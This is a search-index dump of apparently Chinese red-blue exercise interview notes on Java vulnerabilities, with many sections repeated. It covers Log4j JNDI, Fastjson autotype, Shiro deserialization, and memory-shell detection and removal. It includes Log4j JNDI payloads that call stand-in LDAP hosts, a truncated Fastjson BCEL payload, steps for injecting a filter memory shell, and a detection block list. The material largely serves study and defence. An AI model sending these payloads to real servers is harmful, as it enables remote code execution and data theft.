Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； ","date":"2023-11-17","objectID":"/hvv_java/:0:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#log4j漏洞有深入了解吗"},{"categories":["hvv"],"content":"\rLog4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因, **特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 ${jndi:ldap://${sys:java.version}.collaborator.com} ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行 rmi具体过程远端方法调用（Remote Method Invocation） Server端监听一个端口，这个端口是JVM随机选择的； Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； ","date":"2023-11-17","objectID":"/hvv_java/:0:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#ladp注入原理"},{"categories":["hvv"],"content":"\rLog4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因, **特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 ${jndi:ldap://${sys:java.version}.collaborator.com} ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行 rmi具体过程远端方法调用（Remote Method Invocation） Server端监听一个端口，这个端口是JVM随机选择的； Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； ","date":"2023-11-17","objectID":"/hvv_java/:0:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#rmi具体过程"},{"categories":["hvv"],"content":"\r讲一下fastjsonFastjson提供了autotype功能再处理json的时候,允许用户在反序列化数据中通过“@type”指定反序列化的Class类型，没有对指定恶意代码Class的@Type， 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码 ,远程连接rmi主机，反弹shell之类的操作 { { \"x\":{ \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": { \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\" } }: \"x\" } ","date":"2023-11-17","objectID":"/hvv_java/:0:4","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#讲一下fastjson"},{"categories":["hvv"],"content":"\rcc链的4种transformerCC链 1-7 分析 - 先知社区 (aliyun.com) ","date":"2023-11-17","objectID":"/hvv_java/:0:5","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#cc链的4种transformer"},{"categories":["hvv"],"content":"\rshrio反序列化Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–\u003eAES解密–\u003e反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–\u003eAES加密–\u003eBase64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。 Shiro \u003c 1.2.4版本会存在此漏洞，挖掘的时候删除请求包中的rememberMe参数，返回包中包含rememberMe=deleteMe字段。说明使用了shiro组件，可以尝试此漏洞。 如果返回包无此字段，可以通过在发送数据包的cookie中增加字段：****rememberMe=，然后查看返回数据包中是否存在关键字 此漏洞有两个版本利用方式， SHIRO-550： 不需要提供秘钥，使用默认秘钥就可以利用 SHIRO-721: 先爆破秘钥，成功后可以进一步利用 ","date":"2023-11-17","objectID":"/hvv_java/:0:6","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#shrio反序列化"},{"categories":["hvv"],"content":"\rspring漏洞\r","date":"2023-11-17","objectID":"/hvv_java/:0:7","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#spring漏洞"},{"categories":["hvv"],"content":"\rjava执行无回显dnslog、当前环境中找响应对象、抛出异常、web目录里写入html Java 反序列化回显的多种姿势 - 先知社区 (aliyun.com) ","date":"2023-11-17","objectID":"/hvv_java/:0:8","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#java执行无回显"},{"categories":["hvv"],"content":"\r内存马查杀","date":"2023-11-17","objectID":"/hvv_java/:0:9","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马查杀"},{"categories":["hvv"],"content":"\r内存马的分类 servlet-api类 filter型 servlet型 spring类 拦截器 controller型 java Instrumentation类 agent型 filter内存马 创建一个恶意 Filter 利用 FilterDef 对 Filter 进行一个封装 将 FilterDef 添加到 FilterDefs 和 FilterConfig 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发） ","date":"2023-11-17","objectID":"/hvv_java/:0:10","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马的分类"},{"categories":["hvv"],"content":"\r内存马的分类 servlet-api类 filter型 servlet型 spring类 拦截器 controller型 java Instrumentation类 agent型 filter内存马 创建一个恶意 Filter 利用 FilterDef 对 Filter 进行一个封装 将 FilterDef 添加到 FilterDefs 和 FilterConfig 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发） ","date":"2023-11-17","objectID":"/hvv_java/:0:10","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter内存马"},{"categories":["hvv"],"content":"\r查杀思路利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀 ","date":"2023-11-17","objectID":"/hvv_java/:0:11","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#查杀思路"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马的识别"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter名字很特别"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter优先级是第一位"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#对比webxml中没有filter配置"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#特殊class-loader加载"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#对应的classloader路径下面没有class文件"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#dilter的dofilter方法中有恶意代码"},{"categories":["hvv"],"content":"\r内存马的查杀\r内存马判断先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。 通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。 利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀 清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 ","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马的查杀"},{"categories":["hvv"],"content":"\r内存马的查杀\r内存马判断先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。 通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。 利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀 清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 